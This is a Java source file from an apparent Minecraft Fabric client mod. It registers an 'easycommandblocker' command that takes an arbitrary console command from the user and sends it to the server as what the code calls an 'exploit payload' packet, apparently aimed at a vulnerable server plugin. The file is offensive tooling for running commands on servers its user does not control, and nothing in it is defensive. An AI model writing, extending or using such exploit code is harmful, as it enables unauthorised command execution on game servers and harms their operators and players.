package dev.wrrulosdev.mcpclient.client.commands.cmd;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.suggestion.Suggestions;
import com.mojang.brigadier.suggestion.SuggestionsBuilder;
import dev.wrrulosdev.mcpclient.client.commands.Command;
import dev.wrrulosdev.mcpclient.client.constants.ClientConstants;
import dev.wrrulosdev.mcpclient.client.payloads.EasyCommandBlockerPayloadPacket;
import dev.wrrulosdev.mcpclient.client.utils.messages.Msg;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;

import java.util.Objects;
import java.util.concurrent.CompletableFuture;

import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.argument;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;

public class EasyCommandBlockerExploitCommand implements Command {

    /**
     * Registers the easycommandblocker command with the client command system.
     * Allows the user to send a custom console command to the server as an exploit payload.
     *
     * @return A LiteralArgumentBuilder that configures the easycommandblocker command.
     */
    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> register() {
        return literal("easycommandblocker")
            .executes(this::executeRoot)
            .then(argument("consoleCommand", StringArgumentType.greedyString())
                .suggests(this::suggestUsernames)
                .executes(this::executeEasyCommandBlocker));
    }

    /**
     * Suggests usernames to the player based on the current input.
     * This method provides autocomplete suggestions for valid player names
     * when typing the console command.
     *
     * @param context The command context.
     * @param builder The SuggestionsBuilder used to provide suggestions.
     * @return A CompletableFuture containing the suggested usernames.
     */
    private CompletableFuture<Suggestions> suggestUsernames(CommandContext<FabricClientCommandSource> context, SuggestionsBuilder builder) {
        String input = builder.getRemaining().toLowerCase();
        int lastSpaceIndex = input.lastIndexOf(' ');
        String prefix = lastSpaceIndex == -1 ? "" : input.substring(0, lastSpaceIndex + 1);
        String filter = (lastSpaceIndex == -1) ? input : input.substring(lastSpaceIndex + 1).toLowerCase();
        MinecraftClient client = MinecraftClient.getInstance();

        if (client.getNetworkHandler() != null) {
            client.getNetworkHandler().getPlayerList().stream()
                .map(entry -> entry.getProfile().getName())
                .filter(Objects::nonNull)
                .filter(name -> name.toLowerCase().startsWith(filter))
                .forEach(name -> builder.suggest(prefix + name));
        }

        return builder.buildFuture();
    }

    /**
     * Provides usage instructions for the "easycommandblocker" command
     * when it is executed without any arguments.
     *
     * @param context The command context.
     * @return The result of the command execution (0 indicates success).
     */
    private int executeRoot(CommandContext<FabricClientCommandSource> context) {
        Msg.sendFormattedMessage(ClientConstants.PREFIX + "&cUsage: /mcp easycommandblocker <consoleCommand>");
        return 0;
    }

    /**
     * Executes the EasyCommandBlocker exploit payload by sending it to the server.
     * This method sends the EasyCommandBlockerPayloadPacket with the given console command.
     *
     * @param context The command context.
     * @return The result of the command execution (0 indicates success).
     */
    private int executeEasyCommandBlocker(CommandContext<FabricClientCommandSource> context) {
        String command = StringArgumentType.getString(context, "consoleCommand");
        Msg.sendFormattedMessage(ClientConstants.PREFIX + "&aSending the &fEasyCommandBlocker &aPayload Exploit to the server...");
        EasyCommandBlockerPayloadPacket.send(command);
        return 0;
    }
}
